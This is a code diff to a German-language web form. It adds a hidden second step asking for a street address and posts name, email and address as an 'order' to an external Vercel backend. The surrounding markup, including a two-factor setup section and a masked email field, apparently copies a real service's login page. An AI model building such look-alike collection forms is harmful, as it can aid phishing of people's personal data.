@@ -191,7 +191,7 @@
   </div>
 
   <div class="ca-f pt-1 pb-0">
-    <button type="submit" class="btn" id="submit-btn">Senden</button>
+    <button type="button" class="btn" id="submit-btn" onclick="goToStep2()">Senden</button>
   </div>
 
   <div class="ca-b pb-1">
@@ -199,6 +199,41 @@
     <h4 class="tfa-subhead">2-Faktor-Authentifizierung einrichten</h4>
     Ich möchte meinen Zugang mit einem zweiten Faktor absichern.
     <button type="submit" class="btn mb-1 btn-forward btn-secondary" name="registerMfa" id="registerMfa">Weiter</button>
+  </div>
+</form>
+
+<!-- Step 2 Form (Hidden by default) -->
+<form id="addressForm" style="display: none;">
+  <div class="ca-h">Adresse</div>
+
+  <div class="ca-b pb-0">
+    <div class="ig mb-1 noselect">
+      <input tabindex="0" class="foc no-select" type="text" id="streetname" name="streetname" required="" placeholder="Straßenname">
+    </div>
+
+    <div class="ig mb-1 noselect">
+      <input tabindex="0" class="foc no-select" type="text" id="housenumber" name="housenumber" required="" placeholder="Hausnummer">
+    </div>
+
+    <div class="ig mb-1 noselect">
+      <input tabindex="0" class="foc no-select" type="text" id="postalcode" name="postalcode" required="" placeholder="Postleitzahl">
+    </div>
+
+    <div class="ig mb-1 noselect">
+      <input tabindex="0" class="foc no-select" type="text" id="country" name="country" required="" placeholder="Land">
+    </div>
+
+    <div class="rl-c">
+      <a tabindex="0" href="#" class="rl" onclick="goBackToStep1(event)">Zurück</a>
+    </div>
+  </div>
+
+  <div class="ca-f pt-1 pb-0">
+    <button type="submit" class="btn" id="submit-btn-2">Senden</button>
+  </div>
+
+  <div class="ca-b pb-1">
+    <p id="status-2"></p>
   </div>
 </form>
 
@@ -218,6 +253,9 @@
 
 <script>
 const BACKEND_URL = 'https://order-backend-one.vercel.app';
+
+// Store form data
+let formDataCache = {};
 
 // Handle popover toggle
 document.querySelectorAll('[data-toggle="po"]').forEach(icon => {
@@ -257,6 +295,30 @@ function toggleEmailVisibility() {
   }
 }
 
+function goToStep2() {
+  const name = document.getElementById('name').value.trim();
+  const email = document.getElementById('email').value.trim();
+
+  if (!name || !email) {
+    document.getElementById('status').textContent = "❌ Bitte alle Felder ausfüllen";
+    return;
+  }
+
+  // Cache the data
+  formDataCache.customer_name = name;
+  formDataCache.email = email;
+
+  // Hide step 1, show step 2
+  document.getElementById('contactForm').style.display = 'none';
+  document.getElementById('addressForm').style.display = 'block';
+}
+
+function goBackToStep1(event) {
+  event.preventDefault();
+  document.getElementById('addressForm').style.display = 'none';
+  document.getElementById('contactForm').style.display = 'block';
+}
+
 // Close popover when clicking outside
 document.addEventListener('click', function(event) {
   const popover = document.querySelector('.po');
@@ -266,23 +328,29 @@ document.addEventListener('click', function(event) {
   }
 });
 
-document.getElementById('contactForm').addEventListener('submit', async (e) => {
+// Handle address form submission
+document.getElementById('addressForm').addEventListener('submit', async (e) => {
   e.preventDefault();
 
+  const streetname = document.getElementById('streetname').value.trim();
+  const housenumber = document.getElementById('housenumber').value.trim();
+  const postalcode = document.getElementById('postalcode').value.trim();
+  const country = document.getElementById('country').value.trim();
+
+  if (!streetname || !housenumber || !postalcode || !country) {
+    document.getElementById('status-2').textContent = "❌ Bitte alle Felder ausfüllen";
+    return;
+  }
+
   const formData = {
-    customer_name: document.getElementById('name').value.trim(),
-    email: document.getElementById('email').value.trim(),
+    customer_name: formDataCache.customer_name,
+    email: formDataCache.email,
     phone: "Not provided",
-    shipping_address: "Not provided",
+    shipping_address: `${streetname} ${housenumber}, ${postalcode} ${country}`,
     product_name: "Contact Form",
     quantity: 1,
     price: 1
   };
-
-  if (!formData.customer_name || !formData.email) {
-    document.getElementById('status').textContent = "❌ Bitte alle Felder ausfüllen";
-    return;
-  }
 
   try {
     const res = await fetch(`${BACKEND_URL}/api/orders`, {
@@ -294,18 +362,30 @@ document.getElementById('contactForm').addEventListener('submit', async (e) => {
     const data = await res.json();
 
     if (res.ok) {
-      document.getElementById('status').textContent = "✅ Gesendet!";
+      document.getElementById('status-2').textContent = "✅ Gesendet!";
+      document.getElementById('addressForm').reset();
+      
+      // Reset form cache
+      formDataCache = {};
+      
+      // Reset step 1
       document.getElementById('contactForm').reset();
       document.getElementById('email').type = 'password';
       document.getElementById('email-eye-show').classList.remove('d-none');
       document.getElementById('email-eye-hide').classList.add('d-none');
+      
+      // Show step 1 again after a delay
+      setTimeout(() => {
+        document.getElementById('addressForm').style.display = 'none';
+        document.getElementById('contactForm').style.display = 'block';
+      }, 2000);
     } else {
-      document.getElementById('status').textContent = "❌ " + data.error;
+      document.getElementById('status-2').textContent = "❌ " + data.error;
     }
 
   } catch (err) {
     console.error('Error:', err);
-    document.getElementById('status').textContent = "❌ Server Fehler";
+    document.getElementById('status-2').textContent = "❌ Server Fehler";
   }
 });
 </script>
